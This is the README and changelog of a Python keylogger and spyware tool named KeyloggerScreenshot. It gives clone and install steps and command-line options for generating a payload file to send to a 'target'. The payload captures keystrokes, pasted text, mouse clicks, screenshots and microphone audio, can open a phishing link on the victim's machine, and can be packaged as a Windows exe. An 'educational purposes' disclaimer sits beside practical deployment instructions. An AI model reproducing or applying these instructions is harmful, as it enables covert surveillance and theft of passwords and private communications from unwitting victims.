![kali_img](https://user-images.githubusercontent.com/106278241/206914635-c9d5e505-9499-4dce-91ed-5254f495929d.png)
KeyloggerScreenshot
===================

Created by: Fawaz Bashiru

KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Every mouse click will be represented at the server via simulation. Follow the instructions to build your own server in "KeyloggerScreenshot"

check out my pypi page:
https://pypi.org/project/KeyloggerScreenshot/

I would suggest to run KeyloggerScreenshot on Kali linux. But it works on every linux distro

If you are a Linux user. Change to root.

To change root write:

`sudo -i`

In your terminal

To clone KeyloggerScreenshot simply type:

`git clone https://github.com/Kill0geR/KeyloggerScreenshot.git`

In your terminal

Continue by writing: 

`cd KeyloggerScreenshot`

Install all requirements:

`python requirements.py`

If there is any problem with the server than check out the other method on:

https://pypi.org/project/KeyloggerScreenshot/

HOW DOES KeyloggerScreenshot WORK?
==================================

Write your IP-Address in KLS_start.py
`python KLS_start.py -aip 127.0.0.1`

To create a file: 
`python KLS_start.py -aip 127.0.0.1 -cf`

You can send the created file to your target

You can also specify the filename simply write the filename after -cf
`python KLS_start.py -aip 127.0.0.1 -cf test.py`

To create a server with the same ports as the target
`python KLS_start.py -aip 127.0.0.1 -cf -ds`

To see all the ports:
`python KLS_start.py -aip 127.0.0.1 -cf -ds -p`

To activate simulation (every mousclick of the target will be displayed):
`python KLS_start.py -aip 127.0.0.1 -cf -ds -p -sim`

The standard filename is target.py

You can also specify the seconds which is going to be run at the target

`python KLS_start.py -aip 127.0.0.1 -cf test.py -s 120 -sim`

The default seconds is 60

To specify a link that will be opend when executed. Use:

`python KLS_start.py -aip 127.0.0.1 -cf test.py -s 120 -phs https://www.google.com -sim`


After running the code you can send the created filename

After the specified seconds your directory will look like this: 


![endresult](https://user-images.githubusercontent.com/106278241/210905855-35bc8cc1-435e-4dc6-bae7-62fcdedd1484.png)


Output
------
```python
"""
Cyan: ServerPhotos
Blue: ServerKeylogger
Green: ServerListener
White: Timer


Waiting for connection....Waiting for connection...
Waiting for connection...

Connection has been established ![img_2.png](img_2.png)with the ip 127.0.0.1
Time left: 02:59

Connection has been established with ('127.0.0.1', 63822)
Time left: 00:01Connection has been established with ('127.0.0.1', 63842)

Successful connection for 3 minutes and 20 seconds
"Audio of target.wav" has been saved to your directory
Connection has been established with ('127.0.0.1', 63843)
Text of target: Hello this is a test 123. 123 Nice it works have fun  guys 
1 Image have been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63824)
2 Images has been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63825)
3 Images has been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63829)
4 Images has been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63841)
5 Images has been saved to your working directory
Waiting for connection...

"""
```
------------------------------------------------------------------------------------------------------------------------------------------------

Additional
==========
* You can send "target.py" as an exe file to the target with "auto-py-to-exe"

* KeyloggerScreenshot is very easy to use.

* The servers can be used on any OS. The client should be a Windows OS

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.

* Simulation_code.py won't work properly on Virtual Machine

* Server will shutdown automatically after everything has been sent to the server.

* Timer can't be removed (THIS WAS BUILT FOR EDUCATIONAL PURPOSES. THAT'S WHY THERE IS A TIMER SO NOBODY CAN ABUSE THE KEYLOGGER)

Change Log
==========

0.0.1 (14/10/2022)
-----------------
- First Release

0.0.2 (15/10/2022)
-----------------
- Bug Fixes

0.0.3 (15/10/2022)
-----------------
- Bug Fixes

0.0.4 (17/10/2022)
-----------------
- New features (Audio Recorder from target, All Servers in one file)
- Bug Fixes
- Detailed review of the code

0.0.5 (18/10/2022)
-----------------
- Better audio connection
- Bug Fixes

0.0.6 (19/10/2022)
-----------------
- New Timer Class
- Better Output on Terminal
- More efficient connection
- More Ports and IP's

0.0.6.1 (19/10/2022)
------------------
- Bug Fixes

0.0.7 (24/10/2022)
-----------------
- Better Description

0.1.0 (30/10/2022)
-----------------
- Bug Fixes
- pyscreeze Error fixed
- Keyboard Interruption (server will be destroyed after Keyboard Interruption from the user)
- Keylogger data even after Keyboard Interruption
- Much better Audio connection
- Better Audio Files

0.1.1 (30/10/2022)
------------------
- Image fix on website

0.1.2 (7/11/2022)
------------------
- Bug Fixes
- Big Update 12.11.2022

0.2.2 (04/02/2023)
-----------------
- Audio of target got fixed
- Mouse log in fixed
- All Mouse Logs will be saved in "mouseLogInfo.txt"
- new function called "check_double" which detects if there are more files

0.2.3 (10/02/2023)
------------------
- Multiple Mouse Log Text Files at ones
- New Graphical User Interface (GUI)
- New simulation feature (only on linux)
- Capslock detection
- Better documentation

0.2.3.2 (11/02/2023)
--------------------
- Multiple Image Files at ones

0.2.4 (12/02/2023)
-------------------
- special caps characters
- simulation now on windows
- New speed calculation

0.2.4.1 (16/02/2023)
-------------------
- simulation fix

0.2.4.2 (03/03/2023)
-------------------
- stops the process of the python script
- OS Error fixed in Server
- exe file planned for GitHub

0.2.5 (04/03/2023)
-------------------
- Detects if no microphone is pluged in
- Detects if the microphone setting has been disabled
- Cleaner Code
- New Funktion on "ServerPhotos" called "get_data". This funktion gets the data which has been sent via sockets
- KeyloggerScreenshot now runs on servers without a display on github: https://github.com/Kill0geR/KeyloggerScreenshot

0.2.6 (13/03/2023)
-------------------
- You can now open a link on the victims machine
- Set the variable "phishing_web" with your link
- Cleaner code
- No Global variables more


0.2.7 (14/03/2023)
-------------------
- New code on github
- Cleaner code
- More efficient code

0.2.8 (31/03/2023)
-------------------
- Port number fixed
- Already used ports will now be shown

0.2.9 (03/04/2023)
-------------------
- Better Port documentation
- New File "Simulation_code.py" (This stores the code for the simulation. Only on GitHub!!!)
- Cleaner ServerKeylogger code
- New help instruction on KLS_start on GitHub

0.2.9.1 (15/04/2023)
--------------------
- Data which the target has pasted will now be shown on the server
- Documentation incoming

0.3.0 (20/04/2023)
---------------------
- Simulation now stops after stop button is pressed
- Bug fixes
- New Code on "Simulation_code.py" and on "KLS_Start.py"
- New files on github https://github.com/Kill0geR/KeyloggerScreenshot

0.3.1 (26/04/2023)
---------------------
- Bug fixes
- Cleaner Code

0.4.0 (30/04/2023)
--------------------
- Cleaner Code in Simulation_code.py script
- Directories of the target will be deleted after Keyboard interruption
- New File on KeyloggerScreenshot Local_Deleter.py + Documentation
- After Backspace a new list will be shown
- More intelligent Keylogger (understands when to change the list)
- Stops the process of images also in linux with PID
- PID fix on windows
- duration_in_seconds has been changed to 60 seconds from 200 seconds
- Mouseclick information will now be sent after Interruption
- More intelligent Keylogger
- If backspace is pressed the last pressed character will be deleted from the list
- Detects if backspace is hold for a long time

0.4.1 (08/05/2023)
-------------------
- Fixed Interruption Error
- Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code

0.4.2 (23/05/2023)
------------------
- Fixed simulation Error
- Every coordinate will be shown by order

0.4.3 (22/06/2023)
------------------
- Simulation_code.py will now be made if simulater on Server_keylogger is true

0.5.0 (07/07/2023)
------------------
- All Images will now be sent at once
- No more random Images
- More efficient connections
- New Output
- New Name of the images ("Image_Target")
- Data will be stored locally when the server is offline. If the server is online the data will automatically be sent

0.6.0 (10/07/2023)
------------------
- Everything improved from the previous update
- Detects if the server is offline
- Py to exe now works without any issues

0.6.1 (10/07/2023)
------------------
- fixed error

0.6.2 (07/09/2023)
------------------
- fixed README on Pypi


